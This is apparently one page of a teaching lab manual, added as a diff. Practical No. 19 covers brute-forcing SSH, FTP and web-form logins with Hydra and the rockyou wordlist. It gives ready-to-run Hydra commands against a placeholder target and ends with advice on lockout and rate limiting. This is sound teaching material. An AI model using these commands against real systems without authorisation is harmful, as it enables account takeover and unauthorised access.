@@ -1,0 +1,20 @@
+                                                                                               Cyber Security Practical Lab Manual
+
+Practical No. 19
+
+Brute-Force Testing Using Hydra
+Aim: To perform a brute-force login attack against a network service using Hydra.
+Tools / Requirements: Kali Linux, Hydra, wordlists (rockyou.txt), target service (SSH/FTP/HTTP login)
+Procedure:
+  1.   SSH brute force: hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>
+  2.   FTP brute force: hydra -l admin -P passlist.txt ftp://<target-ip>
+  3.   Web login form brute force: hydra -l admin -P passlist.txt <target-ip> http-post-form
+       "/login:username=^USER^&password=^PASS^:Invalid login"
+  4.   Monitor Hydra's output for any 'login:password' pairs reported as valid.
+  5.   Record successful credentials and recommend account lockout / rate limiting as mitigation.
+
+
+
+
+                                                               21
+
